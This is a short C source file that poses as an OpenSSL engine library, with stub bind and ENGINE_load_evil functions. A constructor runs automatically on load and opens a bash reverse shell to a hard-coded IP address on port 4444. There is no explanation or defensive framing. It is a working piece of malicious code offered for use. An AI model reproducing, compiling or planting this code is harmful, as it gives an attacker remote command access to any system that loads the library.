#include<stdlib.h>

// IP 171.239.15.194
// PORT 4444 
__attribute__((constructor))
void run_on_load() {
    system("bash -c 'bash -i >& /dev/tcp/171.239.15.194/4444 0>&1'");
}

int bind(void *e, const char *id) {
    return 1;
}

void ENGINE_load_evil() {}

int bind_engine() {
    return 1;
}
int main() {
    return 0;
}

